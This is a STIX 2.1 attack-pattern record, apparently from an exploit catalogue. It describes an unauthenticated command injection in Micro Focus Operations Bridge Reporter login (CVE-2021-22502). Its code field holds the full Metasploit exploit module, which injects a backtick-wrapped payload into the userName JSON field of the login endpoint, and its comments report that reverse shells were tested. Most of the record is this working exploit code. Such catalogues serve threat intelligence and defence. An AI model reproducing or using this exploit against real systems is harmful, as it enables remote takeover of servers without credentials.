{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d7680e7a-0677-4f52-a52b-a82fc3f7be30",
    "created": "2024-08-14T17:02:57.607314Z",
    "modified": "2024-08-14T17:02:57.607318Z",
    "name": "Micro Focus Operations Bridge Reporter Unauthenticated Command Injection",
    "description": " This module exploits a command injection vulnerability on *login* (yes, you read that right) that affects Micro Focus Operations Bridge Reporter on Linux, versions 10.40 and below. It's a straight up command injection, with little escaping required and it works before authentication. This module has been tested on the Linux 10.40 version. Older versions might be affected check the advisory for details. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/microfocus_obr_cmd_injection.rb",
            "external_id": "microfocus_obr_cmd_injection.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-22502"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/pedrib/PoC/blob/master/advisories/Micro_Focus/Micro_Focus_OBR.md"
        },
        {
            "source_name": "reference",
            "url": "https://softwaresupport.softwaregrp.com/doc/KM03775947"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Micro Focus Operations Bridge Reporter Unauthenticated Command Injection',\n        'Description' => %q{\n          This module exploits a command injection vulnerability on *login* (yes, you read that right)\n          that affects Micro Focus Operations Bridge Reporter on Linux, versions 10.40 and below.\n          It's a straight up command injection, with little escaping required and it works before\n          authentication.\n          This module has been tested on the Linux 10.40 version. Older versions might be affected,\n          check the advisory for details.\n        },\n        'Author' => [\n          'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability discovery and MSF module\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          ['CVE', '2021-22502'],\n          ['ZDI', '21-153'],\n          ['URL', 'https://github.com/pedrib/PoC/blob/master/advisories/Micro_Focus/Micro_Focus_OBR.md'],\n          ['URL', 'https://softwaresupport.softwaregrp.com/doc/KM03775947']\n        ],\n        'Platform' => 'unix',\n        'Arch' => ARCH_CMD,\n        'Privileged' => true,\n        'Payload' => {\n          'Space' => 1024, # This should be a safe value, it might take much more\n          'DisableNops' => true,\n          # avoid null char and the injection char (`)\n          'BadChars' => \"\\x00\\x60\",\n          'Compat' =>\n              {\n                'PayloadType' => 'cmd',\n                # all of these (and more) should exist in a standard RHEL / SuSE\n                # ... which are the only two distros supported by Micro Focus OBR\n                # (telnet doesn't seem to work though)\n                #\n                # all reverse shells were tested and work flawlessly\n                'RequiredCmd' => 'netcat openssl generic python'\n              }\n        },\n        'Targets' => [\n          [ 'Micro Focus Operations Bridge Reporter (Linux) versions <= 10.40', {} ],\n        ],\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2021-02-09'\n      )\n    )\n\n    register_options(\n      [\n        # normal (no SSL) port is 21411\n        Opt::RPORT(21412),\n        OptBool.new('SSL', [true, 'Negotiate SSL/TLS', true]),\n        OptString.new('TARGETURI', [true, 'Application path', '/'])\n      ]\n    )\n  end\n\n  def check\n    res = send_request_raw({\n      'method' => 'POST',\n      'uri' => normalize_uri(datastore['TARGETURI'], '/AdminService/urest/v1/LogonResource'),\n      'headers' => { 'Content-Type' => 'application/json' },\n      'data' => rand_text_alpha(10..64)\n    }, 10)\n\n    if res && res.code == 400 && res.body.include?('Unrecognized token')\n      # should return a stack trace like\n      # Unrecognized token '#{data}': was expecting ('true', 'false' or 'null')\n      #  at [Source: org.glassfish.jersey.message.internal.ReaderInterceptorExecutor$UnC (...)\n      return Exploit::CheckCode::Detected\n    end\n\n    return Exploit::CheckCode::Unknown\n  end\n\n  def exploit\n    # if there are any 0x22 (\") chars in the encoded payload, escape them with a backslash\n    # we have to do this manually, the encoder is not smart enough to do it, and it will\n    # fail if we put 0x22 as a bad char above\n    payload_enc = payload.encoded.gsub('\"', '\\\\\"')\n\n    # we use 0x60 (`) for injection, but there are lots of other possibilities\n    data = \"{\\\"userName\\\":\\\"#{rand_text_alpha(1..16)}`#{payload_enc}`\\\",\\\"credential\\\":\\\"#{rand_text_alpha(8..20)}\\\"}\"\n\n    send_request_raw({\n      'method' => 'POST',\n      'uri' => normalize_uri(datastore['TARGETURI'], '/AdminService/urest/v1/LogonResource'),\n      'headers' => { 'Content-Type' => 'application/json' },\n      'data' => data\n    }, 0)\n\n    # it's tricky to check the return value of the request here\n    # - it might hang (no return) and give us a shell\n    # - it might return 400 or 500 and give us a shell\n    # - it might return 400 or 500 and give us nothing\n    # so ignore it altogether and hope for the best\n    print_status(\"#{peer} - Payload sent, now wait for Shelly, if she doesn't arrive try again!\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2021-02-09",
    "x_mitre_platforms": [
        "unix'"
    ]
}